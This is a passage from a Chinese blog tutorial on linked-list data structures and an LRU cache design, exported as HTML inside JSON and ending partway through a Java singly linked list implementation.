class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>字符串是否是回文字符串：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>今天我们来聊聊“链表 LinkedList”这个数据结构，学习链表有什么用呢，我们先来讨论一个经典的链表使用场景，那就是LRU缓存淘汰算法。</p>\n<p>缓存是一种提高数据读取性能的技术，在硬件设计、软件开发中都有着非常广泛的应用，比如常见的CPU缓存、数据库缓存、浏览器缓存等等。</p>\n<p>缓存的大小有限，当缓存被占满时，那些数据应该被清理出去，那些数据应该被保留？这就需要缓存淘汰策略来决定。常见的策略有这么三种：先进先出策略FIFO(First In First Out)、最少使用策略LFU(Least Frequently Used)、最近最少使用策略LRU(Least Recently Used)。</p>\n<p>今天我们的问题是，怎样用链表来实现一个LRU缓存淘汰策略？</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"链表及其结构\"><a href=\"#链表及其结构\" class=\"headerlink\" title=\"链表及其结构\"></a>链表及其结构</h3></div><br></div>\n\n<p>相比数组，链表是一种稍微复杂一点的数据结构，掌握起来也要比数组要困难一些。数组和链表是两个非常基础、非常常用的数据结构。所以要掌握甚至精通，同时理解其思想。</p>\n<p>我们先从<strong>底层存储结构</strong>来看一下二者的区别：</p>\n<p>为了直观的对比，我画了一张图，从图中可以看到，<strong>数组需要一块连续的内存空间来存储</strong>，对内存的要求比较高，如果我们申请一个100MB大小的内存空间，当内存中没有连续的、足够大的内存空间时，即便剩余的总空间大于100MB，仍然会申请失败。</p>\n<p>而链表恰恰相反，它并不需要一块连续的内存空间，他<strong>通过“指针”将一组零散的内存块连接起来</strong>使用，所以申请一块大小是100MB的链表，根本不会有问题。</p>\n<img src=\"/posts/2018-09-12-算法-链表/数组与链表结构对比.jpg\" title=\"数组与链表结构对比\">\n<p>链表的结构五花八门，今天我们着重介绍三种最常用的链表结构：单链表、双向链表、循环链表。</p>\n<h4 id=\"单链表\"><a href=\"#单链表\" class=\"headerlink\" title=\"单链表\"></a>单链表</h4><p>首先来看最简单、最常用的单链表。我们刚讲到，链表是用指针将一组零散的内存块串联在一起，其中，我们把内存块称为链表的“<strong>结点</strong>”。为了使所有的节点串联起来，每个链表的结点出了需要保存数据之外，还需要记录链上下一个结点的地址，如图所示，我们把这个记录下一个结点指针地址的指针叫做<strong>后继指针 next</strong>。</p>\n<img src=\"/posts/2018-09-12-算法-链表/单链表.jpg\">\n<p>从上面单链表的结构图中，可以发现，单链表中有两个结点是比较特殊的，分别是第一个节点和最后一个结点，我们习惯性的把第一个结点称为<strong>头结点</strong>，最后一个节点称为<strong>尾结点</strong>。其中头结点用来记录链表的基地址，我们可以通过它遍历得到整个链表。而尾结点的特殊之处在于，指针不是指向下一个结点，二是指向了一个空地址null，表示这是链表的最后一个结点。</p>\n<p>与数组一样，链表也支持数据的插入、查找、删除操作。我们知道在进行数组的插入、删除操作时，为了保持内存的连续性，需要做大量的数据搬移操作，所以时间复杂度是O(n)。而在链表中插入或者删除一个数据，我们并不需要保持内存的连续性而搬移结点，因为链表本身的存储空间就不是连续的。所以在链表中插入删除一个数据是非常快的。</p>\n<p>为了方便理解，我画了一张图，从图中我们可以看出，针对链表的插入和删除操作，我们只需要考虑相邻结点的指针改变，所以对应的时间复杂度为O(1)。</p>\n<img src=\"/posts/2018-09-12-算法-链表/单链表插入删除.jpg\">\n<p>但是有利就有弊，链表想要随机访问第K个元素就没有数组那么高效了。因为链表中的数据并非是连续存储的，所以无法像数组那样，根据首地址和下标，通过寻址公式就可以直接计算出对应的内存地址，而是需要一个一个结点依次遍历，直到找到对应的结点。</p>\n<p>你可以把链表想象成一个队伍，每个人都知道自己前面的人是谁，所以当我们希望知道排在第K为的人是谁的时候，就需要从第一个人开始，一个一个往下数。所以链表随机访问的性能没有数组好，时间复杂度为O(n)。</p>\n<p>好了，单链表了解了，下面来看看另外两个复杂的链表：<strong>循环链表和双向链表</strong>。</p>\n<h4 id=\"循环链表\"><a href=\"#循环链表\" class=\"headerlink\" title=\"循环链表\"></a>循环链表</h4><p><strong>循环链表是一种特殊的单链表</strong>。实际上，循环链表也很简单，它和单链表唯一的区别就在尾结点。我们知道，单链表的尾结点是指向空地址，表示这是最后的节点了，而循环链表的尾结点的指针是指向链表的头结点。从下图中可以看出，循环链表想一个环一样首尾相连，所以叫循环链表。</p>\n<img src=\"/posts/2018-09-12-算法-链表/循环链表.jpg\">\n<p>和单链表相比，循环链表的优点是从链尾到链头比较方便。当要处理的数据具有环形结构特点时，就特别适合采用循环链表，比如著名的约瑟夫问题。尽管用单链表也可以实现，但是用循环链表的话，代码就会简洁很多。</p>\n<h4 id=\"双线链表\"><a href=\"#双线链表\" class=\"headerlink\" title=\"双线链表\"></a>双线链表</h4><p>接下来再看一个稍微复杂，在实际的软件开发中，也更加常见的链表结构：<strong>双向链表</strong>。</p>\n<p>单链表只有一个方向，节点只有一个后继指针，next指向后面的结点。而双向链表，顾名思义，它支持两个方向，每个结点不止有一个后继指针next指向后面的结点，还有一个前驱指针prev指向前面的结点。</p>\n<img src=\"/posts/2018-09-12-算法-链表/双向链表.jpg\">\n<p>从上图可以看出，双向链表需要额外的两个空间来存储后继结点和前驱结点的地址。所以，如果存储同样多的数据，双向链表要比单向链表占用更多的内存空间。虽然两个指针比较浪费存储空间，但可以支持双向遍历，这样也带来了双向链表的操作灵活性。那相比单向链表，双向链表适合解决哪种问题呢？</p>\n<p>从结构上来看，双向链表可以支持O(1)时间复杂度的情况下找到前驱结点，正是这样的特点，也使双向链表在某些情况下的删除、插入操作比单链表要简单、高效。</p>\n<p>你可能会说，单链表的插入、删除操作的时间复杂度都已经是O(1)了，双向链表还能怎么高效呢？别着急，刚刚的分析比较偏理论，很多数据结构和算法的书籍也是这么说得，但是这种说法实际上是不准确的，或者说是有先觉条件的。</p>\n<p>我们再来分析一下链表的两个操作，先来看删除操作。在实际的软件开发中，从链表中删除一个数据无外乎这两种情况：</p>\n<ul>\n<li>删除结点中“值等于某个给定值的”结点</li>\n<li>删除给定指针指向的结点</li>\n</ul>\n<p>对于第一种情况，不管是单链表还是双向链表，为了查找到值等于某个给定值的结点，都需要从头开始一个一个依次遍历对比，知道找到值等于给定值的结点，再通过前面讲的指针操作将其删除。</p>\n<p>尽管单纯的删除操作时间复杂度都是O(1)，但是遍历查找的时间是主要的耗时点，对应的时间复杂度为O(n)，根据时间复杂度分析中的加法法则，删除值等于给定值的结点对应的链表操作的总时间复杂度为O(n)。</p>\n<p>对于第二种情况，我们已经找到了要删除的结点，但是删除某个结点q需要知道前驱结点，而单链表并不支持直接获取前驱结点，所以为了找到前驱结点，我们还是要从头结点开始遍历链表，知道p-&gt;next = q，说明p是q的前驱结点。</p>\n<p>但是对于双向链表来说，这种情况就比较有优势了。因为双向链表中的结点已经保存了前驱结点的指针，不需要像单链表那样遍历。所以针对第二种情况，单链表删除操作需要O(n)的时间复杂度，而双向链表只需要在O(1)的时间复杂度内就搞定了！</p>\n<p>同理，如果我们希望在链表的某个指定结点前面插入一个结点，双向链表比单链表有很大优势，双向链表可以在O(1)时间复杂度搞定，而单向链表需要O(n)的时间复杂度。</p>\n<p>除了插入、删除操作有优势之外，对于一个有序链表，双向链表的按值查找的效率也要比单向链表高一些。因为我们可以记录上次查找的位置p，每次查询时，根据要查找的值与p的大小关系，决定是向前查找还是往后查找，所以平均只需要查找一半的数据。</p>\n<p>现在，有没有觉得双向链表比单向链表更加高效呢？这就是问什么在实际的软件开发中，双向链表尽管比较费内存，但还是比单链表的应用更加广泛的原因。如果你熟悉Java语言，你肯定用过LinkedHashMap这个容器，如果你深入研究LinkedHashMap的实现原理，就会发现其中就用到了双向链表这种数据结构。</p>\n<p>实际上，这里有一个更重要的知识点需要你掌握，那就是用空间换时间的设计思想。当内存空间充足时，如果我们更追求代码的执行速度，我们就可以选择空间复杂度相对较高，但时间复杂度相对较低的算法和数据结构。相反，如果内存比较紧缺，比如代码跑在手机或者单机片中，这个时候，就要反过来用时间换空间的涉及思路。</p>\n<p>还是开篇缓存的例子，缓存实际上就是利用了空间换时间的例子。虽然我们将数据存放在磁盘上，会比较节省内存，但是每次查询数据都要查询一遍磁盘，会比较慢。但是我们通过缓存技术，事先将数据加载在内存中，虽然会比较耗费内存空间，但是每次查询数据的速度就大大提高了。</p>\n<p>所以对于执行较慢的程序，可以通过消耗更多的内存(空间换时间)进行优化；而消耗过多内存的程序，可以通过消耗更多的时间(时间换空间)来降低内存的消耗。你还能想到其他时间换空间或者空间换时间的例子吗？</p>\n<p>了解了循环链表和双向链表，如果把这两种链表整合在一起就是一个新的版本：<strong>双向循环链表</strong>。我想不需要我多讲，你应该知道双向循环链表长什么样子了吧？</p>\n<img src=\"/posts/2018-09-12-算法-链表/双向循环链表.jpg\">\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"链表-VS-数组性能大比拼\"><a href=\"#链表-VS-数组性能大比拼\" class=\"headerlink\" title=\"链表 VS 数组性能大比拼\"></a>链表 VS 数组性能大比拼</h3></div><br></div>\n\n<p>通过前面的学习，你应该知道，数组和链表是两种截然不同的内存组织方式，正是因为内存存储的区别，他们插入、删除、随机访问的时间复杂度正好相反。</p>\n<table>\n<thead>\n<tr>\n<th>时间复杂度</th>\n<th>数组</th>\n<th>链表</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>插入删除</td>\n<td>O(n)</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>随机访问</td>\n<td>O(1)</td>\n<td>O(n)</td>\n</tr>\n</tbody>\n</table>\n<p>不过，数组和链表的对比，并不能局限于时间复杂度。而且，在实际的软件开发中，不能仅仅利用复杂度分析就能决定使用那哪个数据结构来存储数据。</p>\n<p>数组简单易用，在实现上使用的是连续的内存空间，可以借助CPU的缓存机制，预读数组中的数据，所以访问效率更高。而链表在内存中并不是连续存储，所以对CPU缓存并不好，没办法有效预读。</p>\n<p>数组的缺点是大小固定，一经声明就要占用整块连续内存空间。如果声明的数组过大，可能没有足够的连续内存空间分配给它，导致“内存不足”。如果声明的数组过小，则可能出现不够用的情况，这时只能再申请一个更大的内存空间，把原数组拷贝进去，非常费时。链表本身没有大小的限制，天然的支持动态扩容，我觉得这也是它与数组最大的区别。</p>\n<p>你可能会说，Java中也有ArrayList容器，也可以支持动态扩容啊？我们上一节已经讲过，当我们往支持动态扩容的数组中插入一个数据时，如果数组中没有空闲空间了，就会申请一个更大的空间，将原数组拷贝过去，而数据拷贝的操作是非常耗时的。</p>\n<p>我举一个稍微极端的例子。如果我们用ArrayList存储了1GB大小的数据，这个时候已经没有空闲空间了，当我们再插入数据的时候，ArrayList会申请一个1.5GB的存储空间，并且把原来那1GB的数据拷贝到新申请的空间上，听起来是不是就很耗时。</p>\n<p>除此之外，如果你的代码对内存的使用非常苛刻，那数组就更适合你。因为链表中的每个结点都需要消耗额外的内存空间去存储一份指向下一个结点的指针，所以内存消耗会翻倍。而且，对链表进行频繁的插入、删除操作，还会导致频繁的内存申请和释放，容易造成内存碎片，如果是java语言，就有可能会导致频繁的GC(Garbage Collection 垃圾回收)。</p>\n<p>所以在实际的开发项目中，要根据不同的项目情况，权衡究竟是选择数组还是链表。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>好了，我们现在回过头来看，如何基于链表实现LRU缓存淘汰算法？</p>\n<p>我的思路是这样的：我们维护一个有序单链表，越靠近链表尾部的结点是越早之前访问的。当有一个新数据被访问时，我们从链表头部开始顺序遍历链表。</p>\n<ol>\n<li><p>如果此数据之前已经被缓存在链表中了，我们遍历得到这个数据对应的结点，并将其从原来的位置删除，再插入到链表的头部。</p>\n</li>\n<li><p>如果此数据没有缓存在链表中，又可以分为两种情况：</p>\n<ul>\n<li>如果此时缓存未满，则将此结点直接插入到链表的头部；</li>\n<li>如果此时缓存已满，则链表尾结点删除，将新的数据结点插入链表的头部。</li>\n</ul>\n</li>\n</ol>\n<p>这样我们就实现了一个LRU缓存，是不是很简单。</p>\n<p>现在我们来看下缓存访问的时间复杂度是多少。因为不管缓存有没有满，我们都需要遍历一遍链表，所以这种基于链表的实现思路，缓存访问的时间复杂度为O(n)。</p>\n<p>实际上，我们可以继续优化这个实现思路，比如引入哈希表(hash table)来记录每个数据的位置，将缓存访问的时间复杂度降到O(1)。这个优化方案，等讲到哈希表的时候再讲。</p>\n<p>基于链表的实现思路，实际上还可以用数组来实现LRU缓存淘汰策略。如何利用数组实现LRU缓存淘汰策略？</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>今天我们讲了一种跟数组“相反”的数据结构，链表。他跟数组一样，也是非常基础、非常常用的数据结构。不过链表要比数组稍微复杂，从普通链表衍生出来好几种链表结构，比如双向链表、循环链表、双向循环链表。</p>\n<p>和数组相比，链表更适合插入、删除操作频繁的场景，查询的时间复杂度较高。不过在具体的软件开发中，要对数组和链表的各种性能进行对比，综合来使用两者中的一个。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3></div><br></div>\n\n<p>如何判断一个字符串是否是回文字符串呢？今天的思考题就是基于这个问题的改造版本。如果字符串是通过单链表来存储的，那如何来判断是一个回文串呢？相应的时间空间复杂度是多少。</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<p><br></p>\n<p>本章代码：<a href=\"https://github.com/AriesRen/algorithm\" target=\"_blank\" rel=\"noopener\">GitHub</a></p>\n<p>带头单链表代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.NoSuchElementException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SinglyLinkedList</span>&lt;<span class=\"title\">T</span>&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Node&lt;T&gt; head;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> size;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">SinglyLinkedList</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.head = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"keyword\">null</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 链表头部插入值</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">linkFirst</span><span class=\"params\">(Node&lt;T&gt; newNode)</span></span>&#123;</span><br><span class=\"line\">        newNode.next = head.next;</span><br><span class=\"line\">        head.next = newNode;</span><br><span class=\"line\">        size++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 链表尾部插入值</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">linkLast</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; newNode = <span class=\"keyword\">new</span> Node&lt;&gt;(val);</span><br><span class=\"line\">        linkLast(newNode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">linkLast</span><span class=\"params\">(Node&lt;T&gt; newNode)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; p = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            p=p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p.next = newNode;</span><br><span class=\"line\">        size++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 获取头部值</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">getFirst</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head.next == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> NoSuchElementException();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> head.next.val;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 获取尾部值</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">getLast</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; p = head.next;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p.val;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 添加</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">add</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; newNode = <span class=\"keyword\">new</span> Node&lt;&gt;(val);</span><br><span class=\"line\">        linkLast(newNode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 在某处索引插入</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">add</span><span class=\"params\">(<span class=\"keyword\">int</span> index, T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; newNode = <span class=\"keyword\">new</span> Node&lt;&gt;(val);</span><br><span class=\"line\">        Node&lt;T&gt; p = node(index);</span><br><span class=\"line\">        insert(p, newNode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">insert</span><span class=\"params\">(Node&lt;T&gt; p, Node&lt;T&gt; newNode)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; q = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (q!=<span class=\"keyword\">null</span> &amp;&amp; q.next!=p)&#123;</span><br><span class=\"line\">            q = q.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (q == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        newNode.next = p;</span><br><span class=\"line\">        q.next = newNode;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 根据值删除某个节点</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">delete</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; p = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next !=<span class=\"keyword\">null</span> &amp;&amp; !p.next.val.equals(val))&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p.next== <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p.next = p.next.next;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 根据索引删除某结点</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">delete</span><span class=\"params\">(<span class=\"keyword\">int</span> index)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; deleteNode = node(index);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> deleteNode(deleteNode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> T <span class=\"title\">deleteNode</span><span class=\"params\">(Node&lt;T&gt; deleteNode)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> T element = deleteNode.val;</span><br><span class=\"line\">        Node&lt;T&gt; p = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next!= <span class=\"keyword\">null</span> &amp;&amp; p.next != deleteNode)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p.next == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p.next = deleteNode.next;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> element;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 根据索引获取值</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">get</span><span class=\"params\">(<span class=\"keyword\">int</span> index)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (index &gt;= size || index &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IndexOutOfBoundsException(<span class=\"string\">\"Index: \"</span>+index + <span class=\"string\">\", Size: \"</span>+size);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> node(index).val;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 通过value 查找对应的索引</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">indexOf</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> index = <span class=\"number\">0</span>;</span><br><span class=\"line\">        Node&lt;T&gt; p = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next !=<span class=\"keyword\">null</span> &amp;&amp; p.next.val!=val)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">            index ++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p.next == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            index = -<span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> index;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span 